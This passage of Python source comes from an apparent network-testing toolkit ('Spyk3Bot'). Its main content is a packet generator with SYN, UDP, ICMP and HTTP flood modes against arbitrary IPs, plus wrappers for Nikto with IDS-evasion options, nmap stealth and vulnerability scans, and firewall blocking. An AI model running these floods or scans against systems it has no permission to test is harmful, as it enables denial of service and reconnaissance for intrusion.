            TrafficType.HTTP_POST: "HTTP POST requests",
            TrafficType.HTTPS: "HTTPS requests",
            TrafficType.DNS: "DNS queries",
            TrafficType.ARP: "ARP requests",
            TrafficType.PING_FLOOD: "ICMP flood",
            TrafficType.SYN_FLOOD: "SYN flood",
            TrafficType.UDP_FLOOD: "UDP flood",
            TrafficType.HTTP_FLOOD: "HTTP flood",
            TrafficType.MIXED: "Mixed traffic types",
            TrafficType.RANDOM: "Random traffic patterns"
        }
        
        self.has_raw_socket_permission = self._check_raw_socket_permission()
    
    def _check_raw_socket_permission(self) -> bool:
        """Check if we have permission to create raw sockets"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            return True
        except PermissionError:
            return False
        except Exception:
            return False
    
    def get_available_traffic_types(self) -> List[str]:
        """Get list of available traffic types based on permissions"""
        available = []
        
        available.extend([
            TrafficType.TCP_CONNECT,
            TrafficType.HTTP_GET,
            TrafficType.HTTP_POST,
            TrafficType.HTTPS,
            TrafficType.DNS
        ])
        
        if self.scapy_available:
            if self.has_raw_socket_permission:
                available.extend([
                    TrafficType.ICMP,
                    TrafficType.TCP_SYN,
                    TrafficType.TCP_ACK,
                    TrafficType.UDP,
                    TrafficType.ARP,
                    TrafficType.PING_FLOOD,
                    TrafficType.SYN_FLOOD,
                    TrafficType.UDP_FLOOD,
                    TrafficType.HTTP_FLOOD,
                    TrafficType.MIXED,
                    TrafficType.RANDOM
                ])
        
        return available
    
    def generate_traffic(self, traffic_type: str, target_ip: str, duration: int, 
                        port: int = None, packet_rate: int = 100, 
                        executed_by: str = "system") -> TrafficGenerator:
        """Generate real traffic to target IP"""
        
        if traffic_type not in self.traffic_types:
            raise ValueError(f"Invalid traffic type. Available: {list(self.traffic_types.keys())}")
        
        max_duration = self.config.get('traffic_generation', {}).get('max_duration', 300)
        if duration > max_duration:
            raise ValueError(f"Duration exceeds maximum allowed ({max_duration} seconds)")
        
        allow_floods = self.config.get('traffic_generation', {}).get('allow_floods', False)
        flood_types = [TrafficType.PING_FLOOD, TrafficType.SYN_FLOOD, 
                       TrafficType.UDP_FLOOD, TrafficType.HTTP_FLOOD]
        if traffic_type in flood_types and not allow_floods:
            raise ValueError(f"Flood traffic types are disabled in configuration")
        
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            raise ValueError(f"Invalid IP address: {target_ip}")
        
        if port is None:
            if traffic_type in [TrafficType.HTTP_GET, TrafficType.HTTP_POST, TrafficType.HTTP_FLOOD]:
                port = 80
            elif traffic_type == TrafficType.HTTPS:
                port = 443
            elif traffic_type == TrafficType.DNS:
                port = 53
            elif traffic_type in [TrafficType.TCP_SYN, TrafficType.TCP_ACK, 
                                  TrafficType.TCP_CONNECT, TrafficType.SYN_FLOOD]:
                port = 80
            elif traffic_type == TrafficType.UDP:
                port = 53
            else:
                port = 0
        
        generator = TrafficGenerator(
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_traffic_generator,
            args=(generator_id, generator, packet_rate, stop_event)
        )
        thread.daemon = True
        thread.start()
        
        self.generator_threads[generator_id] = thread
        self.active_generators[generator_id] = generator
        
        self.db.log_connection(
            local_ip=self._get_local_ip(),
            local_port=0,
            remote_ip=target_ip,
            remote_port=port or 0,
            protocol=traffic_type,
            status="initiated"
        )
        
        return generator
    
    def _run_traffic_generator(self, generator_id: str, generator: TrafficGenerator, 
                               packet_rate: int, stop_event: threading.Event):
        """Run traffic generator in thread"""
        try:
            start_time = time.time()
            end_time = start_time + generator.duration
            packets_sent = 0
            bytes_sent = 0
            packet_interval = 1.0 / max(1, packet_rate)
            
            generator_func = self._get_generator_function(generator.traffic_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    packet_size = generator_func(generator.target_ip, generator.target_port)
                    
                    if packet_size > 0:
                        packets_sent += 1
                        bytes_sent += packet_size
                    
                    time.sleep(packet_interval)
                    
                except Exception as e:
                    logger.error(f"Traffic generation error: {e}")
                    time.sleep(0.1)
            
            generator.packets_sent = packets_sent
            generator.bytes_sent = bytes_sent
            generator.end_time = datetime.datetime.now().isoformat()
            generator.status = "completed" if not stop_event.is_set() else "stopped"
            
            self.db.log_traffic(generator)
            self._save_traffic_log(generator)
            
        except Exception as e:
            generator.status = "failed"
            generator.error = str(e)
            self.db.log_traffic(generator)
            logger.error(f"Traffic generator failed: {e}")
        
        finally:
            if generator_id in self.active_generators:
                del self.active_generators[generator_id]
            if generator_id in self.stop_events:
                del self.stop_events[generator_id]
    
    def _get_generator_function(self, traffic_type: str):
        """Get generator function for traffic type"""
        generators = {
            TrafficType.ICMP: self._generate_icmp,
            TrafficType.TCP_SYN: self._generate_tcp_syn,
            TrafficType.TCP_ACK: self._generate_tcp_ack,
            TrafficType.TCP_CONNECT: self._generate_tcp_connect,
            TrafficType.UDP: self._generate_udp,
            TrafficType.HTTP_GET: self._generate_http_get,
            TrafficType.HTTP_POST: self._generate_http_post,
            TrafficType.HTTPS: self._generate_https,
            TrafficType.DNS: self._generate_dns,
            TrafficType.ARP: self._generate_arp,
            TrafficType.PING_FLOOD: self._generate_ping_flood,
            TrafficType.SYN_FLOOD: self._generate_syn_flood,
            TrafficType.UDP_FLOOD: self._generate_udp_flood,
            TrafficType.HTTP_FLOOD: self._generate_http_flood,
            TrafficType.MIXED: self._generate_mixed,
            TrafficType.RANDOM: self._generate_random
        }
        return generators.get(traffic_type, self._generate_icmp)
    
    def _generate_icmp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return self._generate_ping_socket(target_ip)
        
        try:
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=False)
            return len(packet)
        except Exception as e:
            logger.error(f"ICMP generation failed: {e}")
            return 0
    
    def _generate_ping_socket(self, target_ip: str) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet_id = random.randint(0, 65535)
            sequence = 1
            payload = b"Spyk3Bot Traffic Test"
            
            header = struct.pack("!BBHHH", 8, 0, 0, packet_id, sequence)
            checksum = self._calculate_checksum(header + payload)
            header = struct.pack("!BBHHH", 8, 0, checksum, packet_id, sequence)
            
            packet = header + payload
            sock.sendto(packet, (target_ip, 0))
            sock.close()
            
            return len(packet)
        except Exception as e:
            logger.error(f"Ping socket failed: {e}")
            return 0
    
    def _generate_tcp_syn(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=False)
            return len(packet)
        except Exception as e:
            logger.error(f"TCP SYN generation failed: {e}")
            return 0
    
    def _generate_tcp_ack(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="A", seq=random.randint(0, 1000000))
            send(packet, verbose=False)
            return len(packet)
        except Exception as e:
            logger.error(f"TCP ACK generation failed: {e}")
            return 0
    
    def _generate_tcp_connect(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            
            data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Spyk3Bot\r\n\r\n"
            sock.send(data.encode())
            
            try:
                response = sock.recv(4096)
            except:
                pass
            
            sock.close()
            
            self.db.log_connection(
                local_ip=self._get_local_ip(),
                local_port=0,
                remote_ip=target_ip,
                remote_port=port,
                protocol="tcp_connect",
                status="completed"
            )
            
            return len(data) + 40
        except Exception as e:
            logger.error(f"TCP connect failed: {e}")
            return 0
    
    def _generate_udp(self, target_ip: str, port: int) -> int:
        try:
            if self.scapy_available:
                data = b"Spyk3Bot UDP Test" + os.urandom(32)
                packet = IP(dst=target_ip)/UDP(dport=port)/data
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b"Spyk3Bot UDP Test" + os.urandom(32)
                sock.sendto(data, (target_ip, port))
                sock.close()
                return len(data) + 8
        except Exception as e:
            logger.error(f"UDP generation failed: {e}")
            return 0
    
    def _generate_http_get(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "Spyk3Bot"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            
            self.db.log_connection(
                local_ip=self._get_local_ip(),
                local_port=0,
                remote_ip=target_ip,
                remote_port=port,
                protocol="http_get",
                status="completed"
            )
            
            return len(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n") + len(data) + 100
        except Exception as e:
            logger.error(f"HTTP GET failed: {e}")
            return 0
    
    def _generate_http_post(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            data = "test=data&from=spyk3bot"
            headers = {
                "User-Agent": "Spyk3Bot",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(data))
            }
            conn.request("POST", "/", body=data, headers=headers)
            response = conn.getresponse()
            response_data = response.read()
            conn.close()
            
            self.db.log_connection(
                local_ip=self._get_local_ip(),
                local_port=0,
                remote_ip=target_ip,
                remote_port=port,
                protocol="http_post",
                status="completed"
            )
            
            return len(data) + 200
        except Exception as e:
            logger.error(f"HTTP POST failed: {e}")
            return 0
    
    def _generate_https(self, target_ip: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            conn = http.client.HTTPSConnection(target_ip, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "Spyk3Bot"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            
            self.db.log_connection(
                local_ip=self._get_local_ip(),
                local_port=0,
                remote_ip=target_ip,
                remote_port=port,
                protocol="https",
                status="completed"
            )
            
            return len(data) + 300
        except Exception as e:
            logger.error(f"HTTPS failed: {e}")
            return 0
    
    def _generate_dns(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            answer_rrs = b'\x00\x00'
            authority_rrs = b'\x00\x00'
            additional_rrs = b'\x00\x00'
            
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            
            dns_query = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query + qtype + qclass
            
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            
            self.db.log_connection(
                local_ip=self._get_local_ip(),
                local_port=0,
                remote_ip=target_ip,
                remote_port=port,
                protocol="dns",
                status="completed"
            )
            
            return len(dns_query) + 8
        except Exception as e:
            logger.error(f"DNS query failed: {e}")
            return 0
    
    def _generate_arp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            local_mac = self._get_local_mac()
            
            packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
            sendp(packet, verbose=False)
            
            self.db.log_connection(
                local_ip="0.0.0.0",
                local_port=0,
                remote_ip=target_ip,
                remote_port=0,
                protocol="arp",
                status="request_sent"
            )
            
            return len(packet)
        except Exception as e:
            logger.error(f"ARP generation failed: {e}")
            return 0
    
    def _generate_ping_flood(self, target_ip: str, port: int) -> int:
        return self._generate_icmp(target_ip, port)
    
    def _generate_syn_flood(self, target_ip: str, port: int) -> int:
        return self._generate_tcp_syn(target_ip, port)
    
    def _generate_udp_flood(self, target_ip: str, port: int) -> int:
        return self._generate_udp(target_ip, port)
    
    def _generate_http_flood(self, target_ip: str, port: int) -> int:
        return self._generate_http_get(target_ip, port)
    
    def _generate_mixed(self, target_ip: str, port: int) -> int:
        generators = [
            self._generate_icmp,
            self._generate_tcp_syn,
            self._generate_udp,
            self._generate_http_get
        ]
        generator = random.choice(generators)
        return generator(target_ip, port)
    
    def _generate_random(self, target_ip: str, port: int) -> int:
        traffic_types = [
            TrafficType.ICMP,
            TrafficType.TCP_SYN,
            TrafficType.TCP_ACK,
            TrafficType.UDP,
            TrafficType.HTTP_GET
        ]
        traffic_type = random.choice(traffic_types)
        generator = self._get_generator_function(traffic_type)
        return generator(target_ip, port)
    
    def _calculate_checksum(self, data):
        if len(data) % 2 != 0:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        
        return checksum
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _save_traffic_log(self, generator: TrafficGenerator):
        try:
            filename = f"traffic_{generator.target_ip}_{generator.traffic_type}_{int(time.time())}.json"
            filepath = os.path.join(TRAFFIC_LOGS_DIR, filename)
            
            log_data = {
                "generator": asdict(generator),
                "system_info": {
                    "hostname": socket.gethostname(),
                    "local_ip": self._get_local_ip()
                },
                "performance": {
                    "packets_per_second": generator.packets_sent / max(1, generator.duration),
                    "bytes_per_second": generator.bytes_sent / max(1, generator.duration),
                    "average_packet_size": generator.bytes_sent / max(1, generator.packets_sent)
                }
            }
            
            with open(filepath, 'w') as f:
                json.dump(log_data, f, indent=2)
                
        except Exception as e:
            logger.error(f"Failed to save traffic log: {e}")
    
    def stop_generation(self, generator_id: str = None) -> bool:
        """Stop traffic generation"""
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        
        return False
    
    def get_active_generators(self) -> List[Dict]:
        """Get list of active traffic generators"""
        active = []
        for gen_id, generator in self.active_generators.items():
            active.append({
                "id": gen_id,
                "target_ip": generator.target_ip,
                "traffic_type": generator.traffic_type,
                "duration": generator.duration,
                "start_time": generator.start_time,
                "packets_sent": generator.packets_sent,
                "bytes_sent": generator.bytes_sent
            })
        return active
    
    def get_traffic_types_help(self) -> str:
        """Get help text for traffic types"""
        help_text = "Available Traffic Types:\n\n"
        
        help_text += "📡 Basic Traffic:\n"
        help_text += "  icmp         - ICMP echo requests (ping)\n"
        help_text += "  tcp_syn      - TCP SYN packets (half-open)\n"
        help_text += "  tcp_ack      - TCP ACK packets\n"
        help_text += "  tcp_connect  - Full TCP connections\n"
        help_text += "  udp          - UDP packets\n"
        help_text += "  http_get     - HTTP GET requests\n"
        help_text += "  http_post    - HTTP POST requests\n"
        help_text += "  https        - HTTPS requests\n"
        help_text += "  dns          - DNS queries\n"
        
        if self.has_raw_socket_permission and self.scapy_available:
            help_text += "\n⚠️  Advanced Traffic (requires raw sockets):\n"
            help_text += "  arp          - ARP requests\n"
            help_text += "  ping_flood   - ICMP flood\n"
            help_text += "  syn_flood    - SYN flood\n"
            help_text += "  udp_flood    - UDP flood\n"
            help_text += "  http_flood   - HTTP flood\n"
            help_text += "  mixed        - Mixed traffic types\n"
            help_text += "  random       - Random traffic patterns\n"
        
        return help_text

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    """Nikto web vulnerability scanner integration"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.nikto_available = self._check_nikto()
    
    def _check_nikto(self) -> bool:
        """Check if Nikto is available"""
        nikto_path = shutil.which('nikto')
        if nikto_path:
            logger.info(f"Nikto found at: {nikto_path}")
            return True
        
        common_paths = [
            '/usr/bin/nikto',
            '/usr/local/bin/nikto',
            '/opt/nikto/nikto.pl',
            '/usr/share/nikto/nikto.pl',
            'C:\\Program Files\\nikto\\nikto.pl',
            'C:\\nikto\\nikto.pl'
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                logger.info(f"Nikto found at: {path}")
                return True
        
        logger.warning("Nikto not found. Some features will be limited.")
        return False
    
    def scan(self, target: str, options: Dict = None) -> NiktoResult:
        """Run Nikto scan on target"""
        start_time = time.time()
        options = options or {}
        
        if not self.nikto_available:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=0,
                output_file="",
                success=False,
                error="Nikto is not installed or not in PATH"
            )
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            cmd = self._build_nikto_command(target, output_file, options)
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=options.get('timeout', 600),
                encoding='utf-8',
                errors='ignore'
            )
            
            scan_time = time.time() - start_time
            
            vulnerabilities = self._parse_nikto_output(result.stdout, output_file)
            
            nikto_result = NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=vulnerabilities,
                scan_time=scan_time,
                output_file=output_file,
                success=result.returncode == 0
            )
            
            self.db.log_nikto_scan(nikto_result)
            
            self.db.log_performance(
                scan_speed=len(vulnerabilities) / max(1, scan_time),
                response_time=scan_time,
                packet_loss=0,
                bandwidth=0,
                connections_per_sec=0
            )
            
            return nikto_result
            
        except subprocess.TimeoutExpired:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=time.time() - start_time,
                output_file="",
                success=False,
                error="Scan timed out"
            )
        except Exception as e:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=time.time() - start_time,
                output_file="",
                success=False,
                error=str(e)
            )
    
    def _build_nikto_command(self, target: str, output_file: str, options: Dict) -> List[str]:
        """Build Nikto command with options"""
        nikto_cmd = self._get_nikto_command()
        
        cmd = [nikto_cmd, '-host', target]
        
        if target.startswith('https://') or options.get('ssl', False):
            cmd.append('-ssl')
        
        if 'port' in options:
            cmd.extend(['-port', str(options['port'])])
        elif target.startswith('https://'):
            cmd.extend(['-port', '443'])
        
        if 'tuning' in options:
            cmd.extend(['-Tuning', options['tuning']])
        else:
            cmd.extend(['-Tuning', '123456789'])
        
        cmd.extend(['-Format', 'json', '-o', output_file])
        
        if 'level' in options:
            cmd.extend(['-Level', str(options['level'])])
        
        if 'timeout' in options:
            cmd.extend(['-timeout', str(options['timeout'])])
        
        if 'evasion' in options:
            cmd.extend(['-evasion', str(options['evasion'])])
        
        if 'ids' in options:
            cmd.append('-ids')
        
        if 'mutate' in options:
            cmd.extend(['-mutate', str(options['mutate'])])
        
        if options.get('debug', False):
            cmd.append('-Debug')
        
        if options.get('verbose', False):
            cmd.append('-v')
        
        return cmd
    
    def _get_nikto_command(self) -> str:
        """Get the correct Nikto command/path"""
        nikto_path = shutil.which('nikto')
        if nikto_path:
            return nikto_path
        
        common_paths = [
            '/usr/bin/nikto',
            '/usr/local/bin/nikto',
            '/opt/nikto/nikto.pl',
            '/usr/share/nikto/nikto.pl'
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
        
        return 'nikto'
    
    def _parse_nikto_output(self, output: str, json_file: str) -> List[Dict]:
        """Parse Nikto output and extract vulnerabilities"""
        vulnerabilities = []
        
        if os.path.exists(json_file):
            try:
                with open(json_file, 'r') as f:
                    data = json.load(f)
                    if 'vulnerabilities' in data:
                        vulnerabilities = data['vulnerabilities']
                    elif isinstance(data, list):
                        vulnerabilities = data
            except:
                pass
        
        if not vulnerabilities:
            lines = output.split('\n')
            for line in lines:
                if '+ ' in line or '- ' in line or 'OSVDB' in line or 'CVE' in line:
                    vulnerability = {
                        'description': line.strip(),
                        'severity': self._determine_severity(line),
                        'timestamp': datetime.datetime.now().isoformat()
                    }
                    
                    cve_match = re.search(r'CVE-\d{4}-\d{4,7}', line)
                    if cve_match:
                        vulnerability['cve'] = cve_match.group()
                    
                    osvdb_match = re.search(r'OSVDB-\d+', line)
                    if osvdb_match:
                        vulnerability['osvdb'] = osvdb_match.group()
                    
                    vulnerabilities.append(vulnerability)
        
        return vulnerabilities
    
    def _determine_severity(self, line: str) -> str:
        """Determine severity from Nikto output"""
        line_lower = line.lower()
        
        if any(word in line_lower for word in ['critical', 'severe', 'remote root', 'arbitrary code']):
            return Severity.CRITICAL
        elif any(word in line_lower for word in ['high', 'vulnerable', 'exploit', 'privilege']):
            return Severity.HIGH
        elif any(word in line_lower for word in ['medium', 'warning', 'exposed', 'information']):
            return Severity.MEDIUM
        else:
            return Severity.LOW
    
    def get_available_scan_types(self) -> List[str]:
        """Get available scan types"""
        return [
            "full", "ssl", "cgi", "sql", "xss", "file", "cmd", "info"
        ]
    
    def check_target_ssl(self, target: str) -> bool:
        """Check if target supports SSL"""
        try:
            if '://' in target:
                target = target.split('://')[1]
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, 443))
            sock.close()
            
            return result == 0
        except:
            return False

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    """Comprehensive network tools"""
    
    @staticmethod
    def execute_command(cmd: List[str], timeout: int = 300) -> CommandResult:
        """Execute shell command"""
        start_time = time.time()
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='ignore'
            )
            
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time,
                error=None if result.returncode == 0 else f"Exit code: {result.returncode}"
            )
            
        except subprocess.TimeoutExpired:
            execution_time = time.time() - start_time
            return CommandResult(
                success=False,
                output=f"Command timed out after {timeout} seconds",
                execution_time=execution_time,
                error='Timeout'
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(
                success=False,
                output='',
                execution_time=execution_time,
                error=str(e)
            )
    
    @staticmethod
    def ping(target: str, count: int = 4, size: int = 56, timeout: int = 1, 
             flood: bool = False, **kwargs) -> CommandResult:
        """Ping with advanced options"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), '-l', str(size), '-w', str(timeout * 1000)]
                if flood:
                    cmd.append('-t')
            else:
                cmd = ['ping', '-c', str(count), '-s', str(size), '-W', str(timeout)]
                if flood:
                    cmd.append('-f')
            
            cmd.append(target)
            
            return NetworkTools.execute_command(cmd, timeout * count + 5)
            
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def traceroute(target: str, max_hops: int = 30, no_dns: bool = True, **kwargs) -> CommandResult:
        """Traceroute with options"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert']
                if no_dns:
                    cmd.append('-d')
                cmd.extend(['-h', str(max_hops)])
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1']
                    if no_dns:
                        cmd.append('-n')
                elif shutil.which('traceroute'):
                    cmd = ['traceroute']
                    if no_dns:
                        cmd.append('-n')
                    cmd.extend(['-m', str(max_hops)])
                elif shutil.which('tracepath'):
                    cmd = ['tracepath', '-m', str(max_hops)]
                else:
                    return CommandResult(
                        success=False,
                        output='No traceroute tool found',
                        execution_time=0,
                        error='No traceroute tool available'
                    )
            
            cmd.append(target)
            return NetworkTools.execute_command(cmd, timeout=60)
            
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def nmap_scan(target: str, scan_type: str = "quick", ports: str = None, **kwargs) -> CommandResult:
        """Nmap scan with options"""
        try:
            cmd = ['nmap']
            
            if scan_type == "quick":
                cmd.extend(['-T4', '-F'])
            elif scan_type == "quick_scan":
                cmd.extend(['-T4', '-F', '--max-rtt-timeout', '100ms', '--max-retries', '1'])
            elif scan_type == "comprehensive":
                cmd.extend(['-sS', '-sV', '-sC', '-A', '-O'])
            elif scan_type == "stealth":
                cmd.extend(['-sS', '-T2', '--max-parallelism', '100', '--scan-delay', '5s'])
            elif scan_type == "vulnerability":
                cmd.extend(['-sV', '--script', 'vuln'])
            elif scan_type == "full":
                cmd.extend(['-p-', '-T4'])
            elif scan_type == "udp":
                cmd.extend(['-sU', '-T4'])
            elif scan_type == "os_detection":
                cmd.extend(['-O', '--osscan-guess'])
            elif scan_type == "service_detection":
                cmd.extend(['-sV', '--version-intensity', '5'])
            elif scan_type == "web":
                cmd.extend(['-p', '80,443,8080,8443', '-sV', '--script', 'http-*'])
            
            if ports:
                if ports.isdigit():
                    cmd.extend(['-p', ports])
                else:
                    cmd.extend(['-p', ports])
            elif scan_type not in ["full"] and not any(x in cmd for x in ['-p']):
                cmd.extend(['-p', '1-1000'])
            
            if kwargs.get('no_ping'):
                cmd.append('-Pn')
            if kwargs.get('ipv6'):
                cmd.append('-6')
            
            cmd.append(target)
            
            return NetworkTools.execute_command(cmd, timeout=600)
            
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def curl_request(url: str, method: str = "GET", **kwargs) -> CommandResult:
        """cURL request"""
        try:
            cmd = ['curl', '-s', '-X', method]
            
            if kwargs.get('timeout'):
                cmd.extend(['-m', str(kwargs['timeout'])])
            if kwargs.get('headers'):
                for key, value in kwargs['headers'].items():
                    cmd.extend(['-H', f'{key}: {value}'])
            if kwargs.get('data'):
                cmd.extend(['-d', kwargs['data']])
            if kwargs.get('insecure'):
                cmd.append('-k')
            if kwargs.get('verbose'):
                cmd.append('-v')
            
            cmd.extend(['-w', '\nTime: %{time_total}s\nCode: %{http_code}\nSize: %{size_download} bytes\n'])
            cmd.append(url)
            
            return NetworkTools.execute_command(cmd, timeout=kwargs.get('timeout', 30) + 5)
            
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict[str, Any]:
        """Get IP geolocation"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'ip': ip,
                        'country': data.get('country', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'city': data.get('city', 'N/A'),
                        'isp': data.get('isp', 'N/A'),
                        'lat': data.get('lat', 'N/A'),
                        'lon': data.get('lon', 'N/A')
                    }
            
            return {'success': False, 'ip': ip, 'error': 'Location lookup failed'}
                
        except Exception as e:
            return {'success': False, 'ip': ip, 'error': str(e)}
    
    @staticmethod
    def whois_lookup(target: str) -> CommandResult:
        """WHOIS lookup"""
        if not WHOIS_AVAILABLE:
            return CommandResult(
                success=False,
                output='WHOIS not available',
                execution_time=0,
                error='Install python-whois package'
            )
        
        try:
            import whois
            start_time = time.time()
            result = whois.whois(target)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=True,
                output=str(result),
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def dns_lookup(domain: str, record_type: str = "A") -> CommandResult:
        """DNS lookup"""
        try:
            cmd = ['dig', domain, record_type, '+short']
            return NetworkTools.execute_command(cmd, timeout=10)
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip_firewall(ip: str) -> bool:
        """Block IP using system firewall"""
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(
                        ['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                        check=True,
                        timeout=10
                    )
                    return True
            elif platform.system().lower() == 'windows':
                if shutil.which('netsh'):
                    subprocess.run(
                        ['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                         f'name=Spyk3Bot_Block_{ip}', 'dir=in', 'action=block',
                         f'remoteip={ip}'],
                        check=True,
                        timeout=10
                    )
                    return True
            return False
        except Exception as e:
            logger.error(f"Failed to block IP {ip}: {e}")
            return False
    
    @staticmethod
    def unblock_ip_firewall(ip: str) -> bool:
        """Unblock IP from system firewall"""
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(
                        ['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                        check=True,
                        timeout=10
                    )
                    return True
            elif platform.system().lower() == 'windows':
                if shutil.which('netsh'):
                    subprocess.run(
                        ['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                         f'name=Spyk3Bot_Block_{ip}'],
                        check=True,
                        timeout=10
                    )
                    return True
            return False
        except Exception as e:
            logger.error(f"Failed to unblock IP {ip}: {e}")
            return False
    
    @staticmethod
    def shorten_url(url: str) -> str:
        """Shorten URL using TinyURL"""
        if not SHORTENER_AVAILABLE:
            return url
        
        try:
            import pyshorteners
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except Exception as e:
            logger.error(f"Failed to shorten URL: {e}")
            return url
    
    @staticmethod
    def generate_qr_code(url: str, filename: str) -> bool:
        """Generate QR code for URL"""
